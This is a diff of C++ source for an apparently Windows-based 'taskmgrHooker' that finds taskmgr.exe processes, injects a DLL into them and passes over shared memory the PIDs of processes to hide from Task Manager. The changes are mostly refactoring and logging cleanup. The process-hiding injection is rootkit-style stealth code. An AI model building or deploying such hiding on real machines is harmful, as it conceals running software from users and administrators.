@@ -34,7 +34,7 @@ static int hookTaskmgrProcess(DWORD id, Logger &logger, DllInjector &dllInjector
 }
 
 static void hookTaskmanagers(set<DWORD> &hookedPids, Logger &logger, DllInjector &dllInjector) {
-    const int maxSize = 500; //max process name length
+    const int maxSize = common_consts::MAX_PROCESS_NAME_LENGTH; //max process name length
     HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
     PROCESSENTRY32 pEntry;
 
@@ -44,6 +44,7 @@ static void hookTaskmanagers(set<DWORD> &hookedPids, Logger &logger, DllInjector
 
     set<DWORD> openedTaskmgrsIds;
 
+    // looping over all processes and finding taskmgr.exe ...
     while (hRes) {
         size_t len = lstrlenW(pEntry.szExeFile);
         wcstombs_s(&len, chStr, pEntry.szExeFile, maxSize * sizeof(WCHAR));
@@ -87,30 +88,26 @@ int CALLBACK WinMain(
     _In_  int nCmdShow
     )
 {
-    Logger logger("..\\ProcessControl\\logging\\taskmgrHooker_log.txt", true);
+    Logger logger(common_consts::TASKMGR_HOOKER_LOG_FILENAME, true, true, common_consts::IS_NO_LOGGING);
+
     DllInjector dllInjector;
-
-    logger.info("cmd line: %s", lpCmdLine);
-
     unsigned long sessionTime;
     DWORD procControllPID;
     int waitTime;
 
+    // where must be 3 arguments - session duration time, processControll app pid and controll stab time
     parseCmdLine(lpCmdLine, sessionTime, procControllPID, waitTime);
 
-    const char SHARED_FILE_WITH_PIDS_NAME[] = "Global\\TaskmgrHookerPIDSFile";
-    const size_t MAX_DIGIT_NUM = 15;
-
-    // writing to shared file
+    // writing pids of processes to hide in taskmg.exe to shared file
     logger.info("Creating shared file to write pids");
     my_shared_mem::MemMappedFile sharedFile;
-    if (!sharedFile.create(SHARED_FILE_WITH_PIDS_NAME, (MAX_DIGIT_NUM + 1) * 2)) {
+    if (!sharedFile.create(taskmgt_hook_consts::SHARED_FILE_WITH_PIDS,
+        (common_consts::UL_MAX_DIGIT_NUMBER + 1) * 2)) {
         logger.error("Cannot create shared file to write pids, error: %lu", GetLastError());
         return 1;
     }
-    logger.info("Writing process control pid: %lu", procControllPID);
+
     sharedFile.writeDecimal(procControllPID);
-    logger.info("Writing taskmgr hooker pid: %lu", GetCurrentProcessId());
     sharedFile.writeDecimal(GetCurrentProcessId());
 
     logger.info("Session duration = %lu ; ProcessControll.exe pid = %lu ; Controll Stab = %i", 
@@ -120,6 +117,8 @@ int CALLBACK WinMain(
 
     set<DWORD> hookedPids = {};
     DWORD startTime = GetTickCount();
+
+    // looping for some specified time ...
     do {
         hookTaskmanagers(hookedPids, logger, dllInjector);
         Sleep(waitTime);
